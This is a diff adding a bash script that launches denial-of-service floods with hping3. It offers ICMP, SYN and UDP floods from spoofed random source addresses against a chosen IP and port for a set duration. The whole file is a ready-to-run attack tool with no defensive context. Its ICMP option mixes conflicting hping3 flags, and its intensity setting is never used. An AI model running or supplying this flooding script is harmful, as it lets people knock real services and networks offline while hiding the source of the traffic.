@@ -1,0 +1,70 @@
+#!/bin/bash
+
+# Function to display the script usage
+display_usage() {
+    echo "Usage: $0 [-t <target_ip>] [-p <target_port>] [-a <attack_type>] [-d <duration>] [-i <intensity>]"
+    echo "Options:"
+    echo "  -t <target_ip>: Specify the target IP address (default: 127.0.0.1)"
+    echo "  -p <target_port>: Specify the target port (default: 80)"
+    echo "  -a <attack_type>: Specify the attack type (default: icmp)"
+    echo "                     Available attack types: icmp, syn, udp"
+    echo "  -d <duration>: Specify the attack duration in seconds (default: 60)"
+    echo "  -i <intensity>: Specify the intensity of the attack (default: high)"
+    echo "                     Intensity levels: low, medium, high"
+}
+
+# Default values
+target_ip="127.0.0.1"
+target_port="80"
+attack_type="icmp"
+duration="60"
+intensity="high"
+
+# Parse command line options
+while getopts ":t:p:a:d:i:" option; do
+    case $option in
+        t) target_ip="$OPTARG" ;;
+        p) target_port="$OPTARG" ;;
+        a) attack_type="$OPTARG" ;;
+        d) duration="$OPTARG" ;;
+        i) intensity="$OPTARG" ;;
+        *) display_usage
+           exit 1 ;;
+    esac
+done
+
+# Function to perform the DDoS attack
+perform_ddos_attack() {
+    case $attack_type in
+        icmp)
+            hping3_command="hping3 --flood --rand-source --icmp --data 100 --sign 100 --safe --scan 1000"
+            ;;
+        syn)
+            hping3_command="hping3 --flood --rand-source --syn"
+            ;;
+        udp)
+            hping3_command="hping3 --flood --rand-source --udp"
+            ;;
+        *)
+            echo "Invalid attack type specified."
+            exit 1
+            ;;
+    esac
+
+    echo "Starting $attack_type DDoS attack on $target_ip:$target_port for $duration seconds..."
+    echo "Press Ctrl+C to stop the attack."
+
+    end_time=$((SECONDS + duration))
+    while [ $SECONDS -lt $end_time ]; do
+        $hping3_command $target_ip -p $target_port > /dev/null
+    done
+}
+
+# Main function
+main() {
+    perform_ddos_attack
+    echo "DDoS attack completed."
+}
+
+# Execute the main function
+main
